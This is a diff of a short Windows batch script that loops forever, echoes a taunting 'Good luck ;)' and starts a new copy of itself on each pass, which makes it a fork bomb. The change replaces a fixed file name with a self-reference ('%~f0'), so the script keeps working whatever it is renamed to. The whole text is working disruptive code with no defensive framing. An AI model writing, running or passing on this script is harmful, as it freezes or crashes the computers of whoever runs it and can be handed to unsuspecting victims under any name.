@@ -1,5 +1,5 @@
 @echo off
 :loop
 echo Good luck ;)
-start Test.bat
+start %~f0
 goto loop
